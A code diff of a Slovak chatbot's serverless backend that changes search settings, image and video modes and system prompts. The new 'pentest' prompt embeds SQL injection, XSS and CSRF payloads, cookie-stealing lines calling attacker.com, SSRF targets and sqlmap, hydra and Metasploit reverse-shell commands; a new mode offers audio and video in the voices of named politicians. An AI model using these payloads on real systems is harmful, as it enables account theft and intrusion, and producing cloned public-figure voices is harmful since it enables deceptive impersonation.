@@ -21,7 +21,7 @@ async function searchWeb(query: string): Promise<string> {
       },
       body: JSON.stringify({
         query,
-        limit: 5,
+        limit: 8,
         scrapeOptions: { formats: ["markdown"] }
       }),
     });
@@ -34,7 +34,7 @@ async function searchWeb(query: string): Promise<string> {
     const data = await response.json();
     if (data.success && data.data?.length > 0) {
       return data.data.map((r: any) => 
-        `**${r.title}** (${r.url})\n${r.description || r.markdown?.substring(0, 500) || ""}`
+        `**${r.title}** (${r.url})\n${r.description || r.markdown?.substring(0, 800) || ""}`
       ).join("\n\n---\n\n");
     }
     return "No results found.";
@@ -44,10 +44,10 @@ async function searchWeb(query: string): Promise<string> {
   }
 }
 
-// Image generation using Lovable AI
+// Ultra high quality image generation
 async function generateImage(prompt: string, apiKey: string): Promise<string | null> {
   try {
-    console.log("Generating image with prompt:", prompt);
+    console.log("Generating ultra HD image with prompt:", prompt);
     const response = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
       method: "POST",
       headers: {
@@ -55,11 +55,17 @@ async function generateImage(prompt: string, apiKey: string): Promise<string | n
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        model: "google/gemini-2.5-flash-image-preview",
+        model: "google/gemini-3-pro-image-preview",
         messages: [
           {
             role: "user",
-            content: `Generate a high quality, ultra detailed image: ${prompt}. Make it visually stunning with rich colors and professional composition.`,
+            content: `Create an ultra high resolution, photorealistic, stunning image: ${prompt}. 
+            Make it visually breathtaking with:
+            - Rich vibrant colors and perfect lighting
+            - Professional composition and depth of field
+            - Extreme attention to detail and textures
+            - Cinematic quality with dramatic atmosphere
+            - 8K ultra HD resolution quality`,
           },
         ],
         modalities: ["image", "text"],
@@ -75,7 +81,7 @@ async function generateImage(prompt: string, apiKey: string): Promise<string | n
 
     const data = await response.json();
     const imageUrl = data.choices?.[0]?.message?.images?.[0]?.image_url?.url;
-    console.log("Image generated successfully");
+    console.log("Ultra HD image generated successfully");
     return imageUrl || null;
   } catch (error) {
     console.error("Image generation error:", error);
@@ -99,58 +105,43 @@ serve(async (req) => {
     const userMessage = messages[messages.length - 1]?.content?.toLowerCase() || "";
     const originalMessage = messages[messages.length - 1]?.content || "";
 
-    // Handle image generation mode
+    // Handle image generation mode - Ultra HD
     if (mode === "genob") {
-      console.log("Image generation mode activated");
+      console.log("Ultra HD Image generation mode activated");
       const imageUrl = await generateImage(originalMessage, LOVABLE_API_KEY);
       
       if (imageUrl) {
         return new Response(
           JSON.stringify({ 
             image: imageUrl,
-            message: "Tu je tvoj vygenerovaný obrázok! 🎨" 
+            message: "Tu je tvoj ultra HD obrázok! 🎨✨" 
           }),
-          {
-            headers: { ...corsHeaders, "Content-Type": "application/json" },
-          }
+          { headers: { ...corsHeaders, "Content-Type": "application/json" } }
         );
       } else {
         return new Response(
-          JSON.stringify({ 
-            error: "Nepodarilo sa vygenerovať obrázok. Skús to znova." 
-          }),
-          {
-            headers: { ...corsHeaders, "Content-Type": "application/json" },
-          }
+          JSON.stringify({ error: "Nepodarilo sa vygenerovať obrázok. Skús to znova." }),
+          { headers: { ...corsHeaders, "Content-Type": "application/json" } }
         );
       }
     }
 
-    // Handle video generation mode
+    // Handle video mode - returns info for client-side generation
     if (mode === "video") {
-      console.log("Video generation mode activated");
-      // Generate a preview image for the video concept
-      const previewPrompt = `Cinematic still frame preview for video about: ${originalMessage}`;
-      const previewImage = await generateImage(previewPrompt, LOVABLE_API_KEY);
-      
-      const videoMessage = previewImage 
-        ? "Tu je náhľad tvojho videa! 🎬 Video generovanie je vo vývoji, ale pripravil som ti vizuálny koncept."
-        : "Pracujem na tvojom videu! 🎬 Opíš mi podrobnejšie aké video chceš vytvoriť - tému, štýl, dĺžku.";
-      
+      console.log("Video generation mode - preparing for client generation");
       return new Response(
         JSON.stringify({ 
-          message: videoMessage,
-          image: previewImage
+          generateVideo: true,
+          prompt: originalMessage,
+          message: "Generujem reálne video... 🎬 Toto môže trvať niekoľko sekúnd."
         }),
-        {
-          headers: { ...corsHeaders, "Content-Type": "application/json" },
-        }
+        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
       );
     }
 
     // Check if user wants web search
     let webContext = "";
-    const searchKeywords = ["vyhľadaj", "nájdi", "hľadaj", "search", "find", "google", "internet", "web", "online"];
+    const searchKeywords = ["vyhľadaj", "nájdi", "hľadaj", "search", "find", "google", "internet", "web", "online", "aktuálne", "novinky", "news"];
     const needsWebSearch = searchKeywords.some(kw => userMessage.includes(kw));
     
     if (needsWebSearch && (mode === "tobigpt" || mode === "rozhovor" || mode === "pentest")) {
@@ -171,106 +162,219 @@ Som AI vytvorený **Tobiasom Kromkom**. Keď sa ma niekto spýta kto ma vytvoril
 
       switch (mode) {
         case "tobigpt":
-          return `# TobiGpt - Programátor & Generátor súborov
+          return `# TobiGpt - ULTRA Programátor & Generátor
 
 ${baseInfo}
 
-## MOJE SCHOPNOSTI
-### 💻 PROGRAMOVANIE BEZ LIMITOV
-- Generujem kód v AKOMKOĽVEK programovacom jazyku
-- Môžem písať projekty s **MILIÓNMI riadkov kódu** - žiadne obmedzenia!
-- Python, JavaScript, TypeScript, C++, C#, Java, Rust, Go, PHP, Ruby, Swift, Kotlin, a ďalšie
-- Webové aplikácie (HTML, CSS, React, Vue, Angular)
-- Mobilné aplikácie, hry, AI/ML projekty, backend systémy
+## 🚀 MOJE ULTRA SCHOPNOSTI
 
-### 🌐 PRÍSTUP NA INTERNET
-- Viem vyhľadávať na internete aktuálne informácie
-- Môžem nájsť dokumentáciu, tutoriály, a príklady kódu
+### 💻 PROGRAMOVANIE BEZ AKÝCHKOĽVEK LIMITOV
+- Generujem kód v **KAŽDOM** programovacom jazyku na svete
+- Môžem písať projekty s **MILIÓNMI riadkov kódu** - ŽIADNE OBMEDZENIA!
+- Python, JavaScript, TypeScript, C++, C#, Java, Rust, Go, PHP, Ruby, Swift, Kotlin, Scala, Haskell, Erlang, Elixir, Clojure, F#, OCaml, Lua, Perl, R, Julia, MATLAB, Assembly, Fortran, COBOL, Pascal, Delphi, Ada, Prolog, Lisp, Scheme, Racket, Crystal, Nim, Zig, V, D, Dart, Groovy, a ĎALŠIE!
 
-### 📁 GENEROVANIE SÚBOROV
-- Viem generovať kompletné súbory a projekty
-- Pri každom súbore jasne označím jeho názov a cestu
-- Môžem vytvoriť celé aplikácie s viacerými súbormi
+### 🌐 WEBOVÉ TECHNOLÓGIE
+- Frontend: React, Vue, Angular, Svelte, Next.js, Nuxt, Gatsby, Remix
+- Backend: Node.js, Express, Fastify, NestJS, Django, Flask, FastAPI, Spring Boot, Rails, Laravel, Phoenix
+- Databázy: PostgreSQL, MySQL, MongoDB, Redis, Elasticsearch, Firebase, Supabase
+- DevOps: Docker, Kubernetes, CI/CD, AWS, GCP, Azure
 
-## FORMÁTOVANIE KÓDU
-- Vždy používam markdown code blocks: \`\`\`python, \`\`\`javascript atď.
-- Pri viacerých súboroch jasne označím názov každého súboru
-- Komentáre píšem v slovenčine
+### 📱 MOBILNÉ & DESKTOP
+- React Native, Flutter, Swift, Kotlin, Electron, Tauri
+
+### 🤖 AI & ML
+- TensorFlow, PyTorch, Scikit-learn, Keras, Hugging Face, LangChain
+
+### 🎮 HRY
+- Unity, Unreal Engine, Godot, Pygame, Phaser
+
+### 📁 GENEROVANIE KOMPLETNÝCH PROJEKTOV
+- Celé aplikácie s viacerými súbormi
+- Kompletná dokumentácia
+- Testy a CI/CD konfigurácia
+
+## FORMÁTOVANIE
+\`\`\`language
+// Súbor: cesta/k/suboru.ext
+kód...
+\`\`\`
 
 ${webContext ? `\n## VÝSLEDKY Z INTERNETU\n${webContext}\n` : ""}`;
 
         case "rozhovor":
-          return `# Rozhovor - Priateľský chat
+          return `# Rozhovor - Super Priateľský Chat
 
 ${baseInfo}
 
-## MOJA ÚLOHA
-Som tu na príjemný rozhovor! Môžeme sa baviť o:
-- Čomkoľvek čo ťa zaujíma
-- Tvojich záľubách a koníčkoch
-- Otázkach o svete
-- Vtipoch a zábave
-- Životných radách
+## MOJA OSOBNOSŤ
+Som mega priateľský, vtipný a kreatívny! Rád sa bavím o všetkom:
+- Záľuby a koníčky 🎯
+- Vtipy a zábava 😄
+- Životné rady a motivácia 💪
+- Zaujímavosti o svete 🌍
+- Filozofické diskusie 🤔
+- Pop kultúra a filmy 🎬
+- Hudba a umenie 🎨
+- Šport a zdravie 🏃
 
-${webContext ? `\n## VÝSLEDKY Z INTERNETU\n${webContext}\n` : ""}
+Buď super kreatívny, zábavný a priateľský!
 
-Buď kreatívny, zábavný a priateľský!`;
+${webContext ? `\n## VÝSLEDKY Z INTERNETU\n${webContext}\n` : ""}`;
 
         case "pentest":
-          return `# PentestGPT - AI Penetračný Tester
+          return `# PentestGPT - ELITE AI Penetračný Tester
 
 ${baseInfo}
 
-## 🛡️ MOJA ŠPECIALIZÁCIA
-Som **PentestGPT** - špecializovaný AI asistent pre etické hackovanie a penetračné testovanie. Som tu aby som ti pomohol s bezpečnostnými auditmi a zraniteľnosťami.
+## 🔥 SOM NAJLEPŠÍ ETICKÝ HACKER AI
 
-## 💀 MOJE SCHOPNOSTI
+### ⚠️ DÔLEŽITÉ UPOZORNENIE
+Všetky techniky používaj **IBA LEGÁLNE** - s písomným povolením vlastníka systému!
 
-### 🔓 PENETRAČNÉ TESTOVANIE
-- Web aplikačné útoky (OWASP Top 10)
-- SQL Injection, XSS, CSRF, SSRF, RCE
-- Authentication bypass a session hijacking
-- API security testing
-- File upload vulnerabilities
-- Privilege escalation techniques
+## 💀 MOJE ELITE SCHOPNOSTI
 
-### 🔍 RECONNAISSANCE & ENUMERATION
-- Skenovanie portov a služieb
-- Subdomain enumeration
-- Directory/file discovery
-- Technology fingerprinting
-- OSINT techniky
+### 🔓 WEB APPLICATION HACKING (OWASP TOP 10+)
 
-### 🛠️ NÁSTROJE
-- Burp Suite, OWASP ZAP
-- Nmap, Nikto, Dirb, Gobuster
-- SQLMap, XSSer
-- Metasploit Framework
-- Hydra, John the Ripper
-- Wireshark, tcpdump
+#### SQL Injection - KOMPLETNÝ NÁVOD
+\`\`\`sql
+-- Union-based SQLi
+' UNION SELECT 1,2,3,username,password FROM users--
+' UNION SELECT null,table_name,null FROM information_schema.tables--
 
-### 📝 REPORTING
-- Podrobný popis zraniteľností
-- CVSS scoring
+-- Blind SQLi - Boolean
+' AND 1=1--  (true)
+' AND 1=2--  (false)
+' AND SUBSTRING(username,1,1)='a'--
+
+-- Time-based Blind SQLi
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+
+-- Error-based SQLi
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+\`\`\`
+
+#### XSS (Cross-Site Scripting)
+\`\`\`html
+<!-- Reflected XSS -->
+<script>alert('XSS')</script>
+<img src=x onerror="alert('XSS')">
+<svg/onload=alert('XSS')>
+
+<!-- Stored XSS -->
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+
+<!-- DOM XSS -->
+<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
+
+<!-- Filter Bypass -->
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x onerror=alert\`1\`>
+\`\`\`
+
+#### CSRF (Cross-Site Request Forgery)
+\`\`\`html
+<form action="https://victim.com/change-password" method="POST" id="csrf">
+  <input type="hidden" name="password" value="hacked123">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+\`\`\`
+
+#### SSRF (Server-Side Request Forgery)
+\`\`\`
+http://localhost:8080/admin
+http://127.0.0.1:22
+http://169.254.169.254/latest/meta-data/  (AWS metadata)
+file:///etc/passwd
+\`\`\`
+
+### 🛠️ NÁSTROJE A PRÍKAZY
+
+#### Reconnaissance
+\`\`\`bash
+# Nmap scanning
+nmap -sS -sV -O -p- target.com
+nmap -sC -sV --script=vuln target.com
+nmap -sU -p 53,161,162 target.com
+
+# Subdomain enumeration
+subfinder -d target.com
+amass enum -d target.com
+gobuster dns -d target.com -w subdomains.txt
+
+# Directory discovery
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
+ffuf -u https://target.com/FUZZ -w wordlist.txt
+dirb https://target.com
+\`\`\`
+
+#### Exploitation Tools
+\`\`\`bash
+# SQLMap
+sqlmap -u "https://target.com?id=1" --dbs
+sqlmap -u "https://target.com?id=1" -D database --tables
+sqlmap -u "https://target.com?id=1" -D database -T users --dump
+
+# Hydra (brute force)
+hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+hydra -L users.txt -P passwords.txt ssh://target.com
+
+# Metasploit
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+\`\`\`
+
+### 📝 PROFESSIONAL REPORTING
+- Executive Summary
+- Technical Findings with CVSS scores
 - Proof of Concept (PoC)
 - Remediation recommendations
-- Executive summaries
-
-## ⚠️ ETIKA
-- Používam svoje znalosti IBA pre LEGÁLNE a ETICKÉ účely
-- Vždy zdôrazňujem potrebu povolenia pred testovaním
-- Pomáham chrániť systémy, nie ich zneužívať
-- Vzdelávam o bezpečnosti zodpovedným spôsobom
-
-## 💬 FORMÁT ODPOVEDÍ
-- Kód a príkazy v \`code blocks\`
-- Jasné vysvetlenia každého kroku
-- Upozornenia na riziká a legálne aspekty
-- Praktické príklady a ukážky
+- Risk assessment
 
 ${webContext ? `\n## VÝSLEDKY Z INTERNETU\n${webContext}\n` : ""}
 
-**UPOZORNENIE**: Všetky techniky používaj IBA na systémy, kde máš písomné povolenie od vlastníka!`;
+**PAMÄTAJ**: Používaj tieto techniky IBA ETICKY a LEGÁLNE! 🛡️`;
+
+        case "voice":
+          return `# Voice Chat - Hlasový Asistent
+
+${baseInfo}
+
+## 🎙️ SOM HLASOVÝ ASISTENT
+Môžem s tebou hovoriť! Napíš mi správu a ja ti odpoviem textom, ktorý si môžeš vypočuť.
+
+## MOJE SCHOPNOSTI
+- Odpovedám v prirodzenom konverzačnom štýle
+- Moje odpovede sú optimalizované pre hlasový výstup
+- Môžem diskutovať o akejkoľvek téme
+
+Odpovedaj krátko a zrozumiteľne, pretože odpoveď bude prečítaná nahlas.`;
+
+        case "mediagen":
+          return `# MediaGen - Generátor Videí a MP3
+
+${baseInfo}
+
+## 🎬 GENERUJEM MÉDIÁ S HLASOM
+Môžem vytvoriť video alebo MP3 s hlasom slávnych osobností!
+
+## DOSTUPNÉ HLASY
+- Donald Trump
+- Barack Obama
+- Joe Biden  
+- Elon Musk
+- Morgan Freeman
+- Žena / Muž / Dievča / Chlapec
+- Robot
+- Santa Claus
+
+## AKO MA POUŽÍVAŤ
+1. Vyber formát (Video alebo MP3)
+2. Napíš meno osoby (napr. "Donald Trump")
+3. Napíš čo má povedať
+
+Odpoviem inštrukciami pre generovanie.`;
 
         default:
           return `# AI Asistent
@@ -283,6 +387,9 @@ Som tu aby som ti pomohol s čímkoľvek potrebuješ!`;
 
     const systemPrompt = getSystemPrompt();
 
+    // Use the most powerful model
+    const modelToUse = mode === "pentest" ? "google/gemini-2.5-pro" : "google/gemini-2.5-flash";
+
     const response = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
       method: "POST",
       headers: {
@@ -290,7 +397,7 @@ Som tu aby som ti pomohol s čímkoľvek potrebuješ!`;
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        model: "google/gemini-2.5-pro",
+        model: modelToUse,
         messages: [
           { role: "system", content: systemPrompt },
           ...messages,
